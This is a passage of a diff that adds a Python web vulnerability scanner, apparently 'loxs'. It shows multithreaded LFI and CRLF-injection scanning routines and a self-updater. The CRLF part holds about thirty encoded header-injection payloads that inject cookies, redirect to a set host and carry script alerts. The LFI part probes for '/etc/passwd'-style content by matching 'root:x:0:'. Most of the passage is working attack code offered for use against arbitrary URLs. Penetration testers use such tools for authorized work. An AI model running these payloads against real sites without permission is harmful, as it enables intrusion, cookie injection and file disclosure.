+                print(Fore.GREEN + f"[+] Vulnerable URLs:")
+                for url in scan_state['vulnerable_urls']:
+                    print(Fore.GREEN + f"    {url}")
+            else:
+                print(Fore.YELLOW + "\n[-] No vulnerabilities found.")
+
+            print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")
+
+        except KeyboardInterrupt:
+            print(Fore.MAGENTA + "Please wait, the threads will stop working in a few seconds...")
+            stop_event.set()
+            sleep(2)
+            executor.shutdown(wait=True)
+
+            print(Fore.YELLOW + "[!] Stopped all threads.")
+            print(Fore.RED + "\n[!] Scan interrupted by user.")
+
+            if scan_state and scan_state['vulnerability_found']:
+                print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
+                print(Fore.GREEN + f"[+] Vulnerable URLs:")
+                for url in scan_state['vulnerable_urls']:
+                    print(Fore.GREEN + f"    {url}")
+                
+            else:
+                print(Fore.YELLOW + "\n[-] No vulnerabilities found.")
+                print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")
+
+            sys.exit()
+
+    def run_lfi_scanner(scan_state=None):
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+        init(autoreset=True)
+
+        def get_random_user_agent():
+            return random.choice(USER_AGENTS)
+        
+        def check_and_install_packages(packages):
+            for package, version in packages.items():
+                try:
+                    __import__(package)
+                except ImportError:
+                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', f"{package}=={version}"])
+
+        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
+            session = requests.Session()
+            retry = Retry(
+                total=retries,
+                read=retries,
+                connect=retries,
+                backoff_factor=backoff_factor,
+                status_forcelist=status_forcelist,
+            )
+            adapter = HTTPAdapter(max_retries=retry)
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            return session
+        
+        def test_lfi(url, payloads, success_criteria, max_threads=5):
+            def check_payload(payload):
+                encoded_payload = urllib.parse.quote(payload.strip())
+                target_url = f"{url}{encoded_payload}"
+                start_time = time.time()
+                
+                try:
+                    response = requests.get(target_url)
+                    response_time = round(time.time() - start_time, 2)
+                    result = None
+                    is_vulnerable = False
+                    if response.status_code == 200:
+                        is_vulnerable = any(re.search(pattern, response.text) for pattern in success_criteria)
+                        if is_vulnerable:
+                            result = Fore.GREEN + f"[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
+                        else:
+                            result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
+                    else:
+                        result = Fore.RED + f"[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url} {Fore.CYAN} - Response Time: {response_time} seconds"
+
+                    if is_vulnerable and scan_state:
+                        scan_state['vulnerability_found'] = True
+                        scan_state['vulnerable_urls'].append(target_url)
+                        scan_state['total_found'] += 1
+                    if scan_state:
+                        scan_state['total_scanned'] += 1
+
+                    return result, is_vulnerable
+                except requests.exceptions.RequestException as e:
+                    print(Fore.RED + f"[!] Error accessing {target_url}: {str(e)}")
+                    return None, False
+
+            found_vulnerabilities = 0
+            vulnerable_urls = []
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+                future_to_payload = {executor.submit(check_payload, payload): payload for payload in payloads}
+                for future in as_completed(future_to_payload):
+                    payload = future_to_payload[future]
+                    try:
+                        result, is_vulnerable = future.result()
+                        if result:
+                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload.strip()}")
+                            print(result)
+                            if is_vulnerable:
+                                found_vulnerabilities += 1
+                                vulnerable_urls.append(url + urllib.parse.quote(payload.strip()))
+                    except Exception as e:
+                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
+            return found_vulnerabilities, vulnerable_urls
+
+        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
+            if generate_report == 'y':
+                html_content = generate_html_report("Local File Inclusion (LFI)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
+                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
+                report_file = save_html_report(html_content, filename)
+                
+        def prompt_for_urls():
+            while True:
+                try:
+                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
+                    if url_input:
+                        if not os.path.isfile(url_input):
+                            raise FileNotFoundError(f"File not found: {url_input}")
+                        with open(url_input) as file:
+                            urls = [line.strip() for line in file if line.strip()]
+                        return urls
+                    else:
+                        single_url = input(Fore.CYAN + "[?] Enter a single URL to scan: ").strip()
+                        if single_url:
+                            return [single_url]
+                        else:
+                            print(Fore.RED + "[!] You must provide either a file with URLs or a single URL.")
+                            input(Fore.YELLOW + "\n[i] Press Enter to try again...")
+                            clear_screen()
+                            print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
+                except Exception as e:
+                    print(Fore.RED + f"[!] Error reading input file: {url_input}. Exception: {str(e)}")
+                    input(Fore.YELLOW + "[i] Press Enter to try again...")
+                    clear_screen()
+                    print(Fore.GREEN + "Welcome to the LFI Testing Tool! - AnonKryptiQuz x 1hehaq x Coffinxp x Hexsh1dow x Naho x Hghost010\n")
+
+        def prompt_for_payloads():
+            while True:
+                try:
+                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
+                    if not os.path.isfile(payload_input):
+                        raise FileNotFoundError(f"File not found: {payload_input}")
+                    with open(payload_input, 'r', encoding='utf-8') as f:
+                        payloads = [line.strip() for line in f if line.strip()]
+                    return payloads
+                except Exception as e:
+                    print(Fore.RED + f"[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
+                    input(Fore.YELLOW + "[i] Press Enter to try again...")
+                    clear_screen()
+                    print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
+                    
+        def print_scan_summary(total_found, total_scanned, start_time):
+            summary = [
+                "→ Scanning finished.",
+                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                f"• Total scanned: {total_scanned}",
+                f"• Time taken: {int(time.time() - start_time)} seconds"
+            ]
+            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
+            border = "┌" + "─" * (max_length + 2) + "┐"
+            bottom_border = "└" + "─" * (max_length + 2) + "┘"
+            
+            print(Fore.YELLOW + f"\n{border}")
+            for line in summary:
+                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
+                padding = max_length - len(padded_line)
+                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
+            print(Fore.YELLOW + bottom_border)
+
+
+        def get_file_path(prompt_text):
+            completer = PathCompleter()
+            return prompt(prompt_text, completer=completer).strip()
+
+        clear_screen()
+
+        required_packages = {
+            'requests': '2.28.1',
+            'prompt_toolkit': '3.0.36',
+            'colorama': '0.4.6'
+        }
+
+        check_and_install_packages(required_packages)
+
+        clear_screen()
+
+        panel = Panel(
+        r"""
+    __    __________   _____                                 
+   / /   / ____/  _/  / ___/_________ _____  ____  ___  _____
+  / /   / /_   / /    \__ \/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
+ / /___/ __/ _/ /    ___/ / /__/ /_/ / / / / / / /  __/ /    
+/_____/_/   /___/   /____/\___/\__,_/_/ /_/_/ /_/\___/_/     
+                                                        
+                                                  
+            """,
+        style="bold green",
+        border_style="blue",
+        expand=False
+        )
+        rich_print(panel, "\n")
+
+        print(Fore.GREEN + "Welcome to the LFI Testing Tool!\n")
+
+        urls = prompt_for_urls()
+        payloads = prompt_for_payloads()
+        success_criteria_input = input("[?] Enter the success criteria patterns (comma-separated, e.g: 'root:,admin:', press Enter for 'root:x:0:'): ").strip()
+        success_criteria = [pattern.strip() for pattern in success_criteria_input.split(',')] if success_criteria_input else ['root:x:0:']
+        
+        max_threads_input = input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip()
+        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 0 <= int(max_threads_input) <= 10 else 5
+
+        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
+        clear_screen()
+        print(Fore.CYAN + "[i] Starting scan...\n")
+
+        for url in urls:
+            get_random_user_agent()
+
+        total_found = 0
+        total_scanned = 0
+        start_time = time.time()
+        vulnerable_urls = []
+
+        if scan_state is None:
+            scan_state = {
+                'vulnerability_found': False,
+                'vulnerable_urls': [],
+                'total_found': 0,
+                'total_scanned': 0
+            }
+
+        if payloads:
+            for url in urls:
+                box_content = f" → Scanning URL: {url} "
+                box_width = max(len(box_content) + 2, 40)
+                print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+                print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+                print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+                found, urls_with_payloads = test_lfi(url, payloads, success_criteria, max_threads)
+                total_found += found
+                total_scanned += len(payloads)
+                vulnerable_urls.extend(urls_with_payloads)
+
+        print_scan_summary(total_found, total_scanned, start_time)
+        save_results(vulnerable_urls, total_found, total_scanned, start_time)
+
+        if scan_state['vulnerability_found']:
+            print(Fore.GREEN + f"\n[+] Vulnerabilities found: {scan_state['total_found']}")
+            print(Fore.GREEN + f"[+] Vulnerable URLs:")
+            for url in scan_state['vulnerable_urls']:
+                print(Fore.GREEN + f"    {url}")
+        else:
+            print(Fore.YELLOW + "\n[-] No vulnerabilities found.")
+
+        print(Fore.CYAN + f"\n[i] Total URLs scanned: {scan_state['total_scanned']}")
+
+        exit()
+        
+    def run_crlf_scanner(scan_state=None):
+        init(autoreset=True)
+
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+        def get_domain(url):
+            parsed_url = urlparse(url)
+            return parsed_url.netloc
+
+        def generate_payloads(url):
+            domain = get_domain(url)
+            base_payloads = [
+                "/%%0a0aSet-Cookie:loxs=injected",
+                "/%0aSet-Cookie:loxs=injected;",
+                "/%0aSet-Cookie:loxs=injected",
+                "/%0d%0aLocation: http://loxs.pages.dev",
+                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
+                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
+                "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
+                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
+                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
+                "/%0d%0aLocation: loxs.pages.dev",
+                "/%0d%0aSet-Cookie:loxs=injected;",
+                "/%0aSet-Cookie:loxs=injected",
+                "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
+                "/%23%0aSet-Cookie:loxs=injected",
+                "/%25%30%61Set-Cookie:loxs=injected",
+                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
+                "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
+                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+                "/%5Cr%20Set-Cookie:loxs=injected;",
+                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
+                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
+                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
+                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
+                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
+                "/%u000ASet-Cookie:loxs=injected;",
+                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
+                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
+            ]
+            
+            return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]
+
+        REGEX_PATTERNS = [
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
+        ]
+
+        def get_random_user_agent():
+            return random.choice(USER_AGENTS)
+
+        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
+            session = requests.Session()
+            retry = Retry(
+                total=retries,
+                read=retries,
+                connect=retries,
+                backoff_factor=backoff_factor,
+                status_forcelist=status_forcelist,
+            )
+            adapter = HTTPAdapter(max_retries=retry)
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            return session
+
+        def check_crlf_vulnerability(url, payload, scan_state=None):
+            target_url = f"{url}{payload}"
+            start_time = time.time()
+
+            headers = {
+                'User-Agent': get_random_user_agent(),
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'close'
+            }
+
+            result = None
+
+            try:
+                session = get_retry_session()
+                response = session.get(target_url, headers=headers, allow_redirects=False, verify=False, timeout=10)
+                response_time = time.time() - start_time
+
+                is_vulnerable = False
+                vulnerability_details = []
+
+                for header, value in response.headers.items():
+                    combined_header = f"{header}: {value}"
+                    if any(re.search(pattern, combined_header, re.IGNORECASE) for pattern in REGEX_PATTERNS):
+                        is_vulnerable = True
+                        vulnerability_details.append(f"{Fore.WHITE}Header Injection: {Fore.LIGHTBLACK_EX}{combined_header}")
+
+                if any(re.search(pattern, response.text, re.IGNORECASE) for pattern in REGEX_PATTERNS):
+                    is_vulnerable = True
+                    vulnerability_details.append(f"{Fore.WHITE}Body Injection: {Fore.LIGHTBLACK_EX}Detected CRLF in response body")
+
+                if response.status_code in [200, 201, 202, 204, 205, 206, 207, 301, 302, 307, 308]:
+                    if is_vulnerable:
+                        result = (Fore.GREEN + f"[✓] {Fore.CYAN}Vulnerable: {Fore.GREEN} {target_url} "
+                                f"{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
+                        if vulnerability_details:
+                            result += "\n    {}↪ ".format(Fore.YELLOW) + "\n    {}↪ ".format(Fore.YELLOW).join(vulnerability_details)
+                    else:
+                        result = (Fore.RED + f"[✗] {Fore.CYAN}Not Vulnerable: {Fore.RED} {target_url} "
+                                f"{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
+
+                if scan_state:
+                    scan_state['total_scanned'] += 1
+                    if is_vulnerable:
+                        scan_state['vulnerability_found'] = True
+                        scan_state['vulnerable_urls'].append(target_url)
+                        scan_state['total_found'] += 1
+
+                return result, is_vulnerable
+
+            except requests.exceptions.RequestException as e:
+                result = Fore.RED + f"[!] Error accessing {target_url}: {str(e)}"
+                print(result)
+                return result, False
+
+        def test_crlf(url, max_threads=5):
+            found_vulnerabilities = 0
+            vulnerable_urls = []
+            payloads = generate_payloads(url)
+
+            with ThreadPoolExecutor(max_workers=max_threads) as executor:
+                future_to_payload = {executor.submit(check_crlf_vulnerability, url, payload): payload for payload in payloads}
+                for future in as_completed(future_to_payload):
+                    payload = future_to_payload[future]
+                    try:
+                        result, is_vulnerable = future.result()
+                        if result:
+                            print(Fore.YELLOW + f"[→] Scanning with payload: {payload}")
+                            print(result)
+                            if is_vulnerable:
+                                found_vulnerabilities += 1
+                                vulnerable_urls.append(url + payload)
+                    except Exception as e:
+                        print(Fore.RED + f"[!] Exception occurred for payload {payload}: {str(e)}")
+            return found_vulnerabilities, vulnerable_urls
+
+        def print_scan_summary(total_found, total_scanned, start_time):
+            summary = [
+                "→ Scanning finished.",
+                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
+                f"• Total scanned: {total_scanned}",
+                f"• Time taken: {int(time.time() - start_time)} seconds"
+            ]
+            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
+            border = "┌" + "─" * (max_length + 2) + "┐"
+            bottom_border = "└" + "─" * (max_length + 2) + "┘"
+            
+            print(Fore.YELLOW + f"\n{border}")
+            for line in summary:
+                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
+                padding = max_length - len(padded_line)
+                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
+            print(Fore.YELLOW + bottom_border)
+
+        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
+            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
+            if generate_report == 'y':
+                html_content = generate_html_report("Carriage Return Line Feed Injection (CRLF)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
+                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
+                report_file = save_html_report(html_content, filename)
+
+        def get_file_path(prompt_text):
+            return prompt(prompt_text, completer=PathCompleter())
+
+        def prompt_for_urls():
+            while True:
+                try:
+                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
+                    if url_input:
+                        if not os.path.isfile(url_input):
+                            raise FileNotFoundError(f"File not found: {url_input}")
+                        with open(url_input) as file:
+                            urls = [line.strip() for line in file if line.strip()]
+                        return urls
+                    else:
+                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
+                        if single_url:
+                            return [single_url]
+                        else:
+                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
+                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
+                            clear_screen()
+                            print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
+                except Exception as e:
+                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
+                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
+                    clear_screen()
+                    print(f"{Fore.GREEN}Welcome to the CRLF Injection Testing Tool!\n")
+        
+        clear_screen()
+        panel = Panel(
+        r"""
+   __________  __    ______
+  / ____/ __ \/ /   / ____/  ______________ _____  ____  ___  _____
+ / /   / /_/ / /   / /_     / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
+/ /___/ _, _/ /___/ __/    (__  ) /__/ /_/ / / / / / / /  __/ /
+\____/_/ |_/_____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/
+
+        """,
+        style="bold green",
+        border_style="blue",
+        expand=False
+        )
+        rich_print(panel, "\n")
+
+        print(Fore.GREEN + "Welcome to the CRLF Injection Testing Tool!\n")
+
+        urls = prompt_for_urls()
+        
+        max_threads_input = input("[?] Enter the number of concurrent threads (1-10, press Enter for 5): ").strip()
+        max_threads = int(max_threads_input) if max_threads_input.isdigit() and 1 <= int(max_threads_input) <= 10 else 5
+
+        print(Fore.YELLOW + "\n[i] Loading, Please Wait...")
+        clear_screen()
+        print(Fore.CYAN + "[i] Starting scan...\n")
+
+        total_found = 0
+        total_scanned = 0
+        start_time = time.time()
+        vulnerable_urls = []
+
+        if scan_state is None:
+            scan_state = {
+                'vulnerability_found': False,
+                'vulnerable_urls': [],
+                'total_found': 0,
+                'total_scanned': 0
+            }
+
+        for url in urls:
+            box_content = f" → Scanning URL: {url} "
+            box_width = max(len(box_content) + 2, 40)
+            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
+            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
+            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
+
+            found, urls_with_payloads = test_crlf(url, max_threads)
+            total_found += found
+            total_scanned += len(generate_payloads(url))
+            vulnerable_urls.extend(urls_with_payloads)
+
+        print_scan_summary(total_found, total_scanned, start_time)
+        save_results(vulnerable_urls, total_found, total_scanned, start_time)
+
+        print(Fore.RED + "\nExiting...")
+        exit()
+        
+        
+    
+    def run_update():
+        console = Console()
+        def display_update_intro():
+            panel = Panel(
+                r"""
+██    ██ ███████ ███████  ███████ ████████ ███████ 
+██    ██ ██   ██ ██    ██ ██   ██    ██    ██      
+██    ██ ███████ ██    ██ ███████    ██    █████   
+██    ██ ██      ██    ██ ██   ██    ██    ██      
+████████ ██      ███████  ██   ██    ██    ███████ 
+        """,
+                title="LOXS UPDATER",
+                expand=False,
+                border_style="blue",
+                style="bold green",
+            )
+            console.print(panel)
+            console.print("[cyan] Welcome to the loxs updater![/cyan]\n")
+
+        def get_latest_release(repo_owner, repo_name):
+            url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
+            try:
+                response = requests.get(url)
+                response.raise_for_status()
+                release_data = response.json()
+                return release_data['tag_name'], release_data
+            except requests.exceptions.RequestException as e:
+                console.print(f"[red][!] Error fetching release information: {e}[/red]")
+                return None, None
+
+        def get_current_version():
+            try:
+                with open(__file__, 'r') as file:
+                    for line in file:
+                        if line.startswith('VERSION ='):
+                            return line.split('=')[1].strip().strip("'\"")
+            except IOError as e:
+                console.print(f"[red][!] Error reading current version: {e}[/red]")
+            return None
+
+        def download_update(download_url, file_path):
+            try:
+                try:
+                    from rich.progress import Progress
+                    
+                    with Progress() as progress_bar:
+                        task = progress_bar.add_task("Downloading update...", total=100)
+                        response = requests.get(download_url, stream=True)
+                        response.raise_for_status()
+                        
+                        total_size = int(response.headers.get('content-length', 0))
+                        block_size = 1024
+                        downloaded = 0
+                        
+                        with open(file_path, 'wb') as file:
+                            for data in response.iter_content(block_size):
+                                size = file.write(data)
+                                downloaded += size
+                                if total_size > 0:
+                                    progress_percentage = (downloaded / total_size) * 100
+                                    progress_bar.update(task, completed=progress_percentage)
+                                    
+                except ImportError:
+                    console.print("[cyan]Downloading update...[/cyan]")
+                    response = requests.get(download_url)
+                    response.raise_for_status()
+                    with open(file_path, 'wb') as file:
+                        file.write(response.content)
+                        
+                console.print("[green][✓] Update downloaded successfully.[/green]")
+                return True
+                
+            except requests.exceptions.RequestException as e:
+                console.print(f"[red][!] Error downloading update: {e}[/red]")
+                return False
+            except Exception as e:
+                console.print(f"[red][!] Unexpected error during download: {e}[/red]")
+                return False
+
+        def normalize_version(v):
+            # Remove 'v' prefix if present
+            # v = v.lstrip('v')
+
+            # Three components (major.minor.patch)
+            parts = v.split('.')
+            while len(parts) < 4:
+                parts.append('0')
+            return '.'.join(parts)
+
+        display_update_intro()
+
+        repo_owner = "coffinxp"
+        repo_name = "loxs"
+        current_version = get_current_version()
+
+        if current_version is None:
+            console.print("[yellow][!] Unable to find current version.[/yellow]")
+            input("\nPress Enter to return to the main menu...")
+            return
+
+        console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
+        console.print("[cyan][i] Checking for updates...[/cyan]")
+
+        latest_version, release_data = get_latest_release(repo_owner, repo_name)
+
+        if latest_version is None:
+            console.print("[yellow][!] Unable to check for updates.[/yellow]")
+            input("\nPress Enter to return to the main menu...")
+            return
+
+        current_v = version.parse(normalize_version(current_version))
+        latest_v = version.parse(normalize_version(latest_version))
+
+        if latest_v > current_v:
+            console.print(f"[green][✓] New version available: {latest_version}[/green]")
+            update_choice = console.input("[cyan][?] Do you want to update? (y/n): [/cyan]").lower().strip()
+            
+            if update_choice == 'y':
+                try:
+                    download_url = release_data['assets'][0]['browser_download_url']
+                    
+                    if download_update(download_url, __file__):
+                        console.print("[green][✓] Update completed. Please restart loxs..!![/green]")
+                    else:
+                        console.print("[red][!] Update failed.[/red]")
+                except (KeyError, IndexError) as e:
+                    console.print(f"[red][!] Error fetching release assets: {e}[/red]")
+            else:
+                console.print("[yellow][i] Update cancelled.[/yellow]")
+        else:
+            console.print("[green][✓] You are already using the latest version.[/green]")
+            console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
+            console.print(f"[cyan][i] Latest version: {latest_version}[/cyan]")
+
+        input("\nPress Enter to return to the main menu...")
+
+
+    def handle_selection(selection):
+        
+        if selection == '1':
+            clear_screen()
+            run_lfi_scanner()
+
+        elif selection == '2':
+            clear_screen()
+            run_or_scanner()
+
+        elif selection == '3':
+            clear_screen()
+            run_sql_scanner()
+
+        elif selection == '4':
+            clear_screen()
+            run_xss_scanner()
+
+        elif selection == '5':
+            clear_screen()
+            run_crlf_scanner()
+
+        elif selection == '6':
+            clear_screen()
+            run_update()
+            clear_screen()
+
+        elif selection == '7':
+            clear_screen()
+            print_exit_menu()
+
+        else:
+            print_exit_menu()
+
+    stop_event = threading.Event()
+    scan_running = True
+
+    def main():
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        clear_screen()
+
+        while scan_running:
+            try:
+                display_menu()
+                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-7): {Style.RESET_ALL}").strip()
+                handle_selection(choice)
+            except KeyboardInterrupt:
+                print_exit_menu()
+                break
+
+    if __name__ == "__main__":
+        main()
+
+except KeyboardInterrupt:
+    sys.exit()
